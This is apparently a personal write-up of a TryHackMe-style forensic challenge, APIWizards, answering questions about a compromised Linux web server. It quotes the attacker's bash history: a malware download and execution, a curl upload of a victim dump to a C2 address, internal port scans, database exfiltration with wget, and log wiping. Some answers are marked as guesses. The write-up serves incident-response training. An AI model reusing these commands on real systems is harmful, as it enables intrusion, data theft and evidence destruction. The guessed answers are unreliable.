# APIWizards Writeup

Name: APIWizards
Date:  
Difficulty:  
Goals:  
Learnt:
Beyond Root:

- [[APIWizards-Notes.md]]
- [[APIWizards-CMD-by-CMDs.md]]

![](initialsshin.png)

Worst persistence ever...
![](initialweirdbehaviour.png)
Without bulldoozing anywhere else and look into dev's home directoy this is C2 address btw
![](niceipthere.png)

![](someauth.png)

![](sstulpn.png)

![](badhistory.png)

![](rootbashrc.png)

That time code in the source code of apiserver was already a massive red flag I am actual glad I did this the proper way rather lead chasing 
![](accesslog-1.png)

```
cd /tmp/
wget https://transfer.sh/2tttL9HJLG/rooter2
file rooter2 
chmod +x rooter2 && ./rooter2
cd /root/
ls -la
cat .ssh/authorized_keys 
ll .ssh/
curl --upload-file .dump.json http://5.230.66.147/me7d6bd4beh4ura8/upload
nc -zv 192.168.0.22 22
nc -zv 192.168.0.22 1024-10000 2>&1 | grep -v failed
curl -v 192.168.0.22:8080
wget 192.168.0.22:8080/cde-backup.csv
>/var/log/wtmp
>/var/log/btmp
lastlog --clear --user root
lastlog --clear --user dev
mv cde-backup.csv .review.csv 
systemctl status nginx
systemctl status apiservice
curl localhost
systemctl status apiservice
exit

```

```
{"C0":"ODguMTU2LjEzMi42Nw==","C1":"cHJvZC13ZWItMDAzOjoyMDIzLTA3LTMwIDE2OjAzOjI2Ojo1LjE1LjAtNzgtZ2VuZXJpYzo6VWJ1bnR1IDIyLjA0LjIgTFRTOjpzc2gtMjI=","C2":"MTkyLjE2OC4wLjIxOjIyOjoxOTIuMTY4LjAuMjE6ODA6OjE5Mi4xNjguMC4yMjoyMg=="}
```

Got all but without notes
```
How does the bind shell persist across reboots?  

What is the absolute path of the malicious service?

Can you spot and name one more popular persistence method?  

What are the original and the backdoored binaries from question 6?
```

Which programming language is a web application written in?  
```
ls -la /home/dev/apiserver
Python
```
What is the IP address that attacked the web server?  
```
cat /var/log/nginx/access.log.1
149.34.244.142
```

Which vulnerability was found and exploited in the API service?  
```
cat /var/log/nginx/access.log.1
# I put sh command injection, because I forget we are injecting onto an OS props to THM for the correcting correctish answers unlike some company
OS command injection
```

Which file contained the credentials used to privesc to root?  
```
# cat the answer
/home/dev/apiservice/src/config.py
```

What file did the hacker drop and execute to persist on the server?  
```
# This so annoying, because how is drop this into /tmp persistence? AAAAAAAAAAARG
/tmp/rooter2
```
Which service was used to host the “rooter2” malware?
```
cat /root/.bash_history
transfer.sh
```
Which two system files were infected to achieve cron persistence?
```
/etc/crontab, /etc/environment
```
What is the C2 server IP address of the malicious actor?  
```
5.230.66.147
```

What port is the backdoored bind bash shell listening at?  
```
3578
```
How does the bind shell persist across reboots?  
```
# Guess 
systemd service
```
What is the absolute path of the malicious service?
```
ls -la /etc/systemd/system/ 
echo $((1786*2+6))
# /tmp/s is weird 
cat /etc/systemd/system/socket.service

/etc/systemd/system/socket.service
```
Which port is blocked on the victim's firewall?
```
cat /root/.bashrc
3578
```
How do the firewall rules persist across reboots?  
```
cat /root/.bashrc
/root/.bashrc
```
How is the backdoored local Linux user named?
```
ls -la /home
support
```
Which privileged group was assigned to the user?  
```
# I guessed, but cat /etc/group 
cat /var/log/auth.log.1 # is the best for the brain way
sudo
```
What is the strange word on one of the backdoored SSH keys?  
```
cat /root/.ssh/authorized_keys
ntsvc
```
Can you spot and name one more popular persistence method?  
```
# dork persistence - could not find this 
SUID binary
```
What are the original and the backdoored binaries from question 6?  
```
# Guess bash because I could not find it with 
find / -type f -perm -04000 -exec ls -la {} \; 2>/dev/null
# but was use in the other persistence and clamav, bacause why
/usr/bin/bash, /usr/bin/clamav
```
What technique was used to hide the backdoor creation date?
```
# Guess
Timestomping
```
What file was dropped which contained gathered victim information?
```
/root/.dump.json
```
According to the dropped dump, what is the server’s kernel version?  
```
cat /root/.bash_history 
wget 192.168.0.22:8080/cde-backup.csv
>/var/log/wtmp
>/var/log/btmp

5.15.0-78-generic

```
Which active internal IPs were found by the “rooter2” network scan?  
```
cat /root/.bash_history and cat .dump.json 
192.168.0.22, 192.168.0.21 
```
How did the hacker find an exposed HTTP index on another internal IP?  
```
# was think too hard for this one...
# the . dots made think it was a command and then what command is XX oh nc OH
cat /root/.bashrc
nc -zv 192.168.0.22 1024-10000 2>&1 | grep -v failed
```

What command was used to exfiltrate the CDE database from the internal IP?  
```
cat /root/.bash_history 
wget 192.168.0.22:8080/cde-backup.csv
```
What is the most secret and precious string stored in the exfiltrated database?
```
cat /root/.review.csv
pwned{v3ry-secur3-cardh0ld3r-data-environm3nt}
```

## Post-Root-Reflection  

## Beyond Root

Linux Named Pipes for KOTH
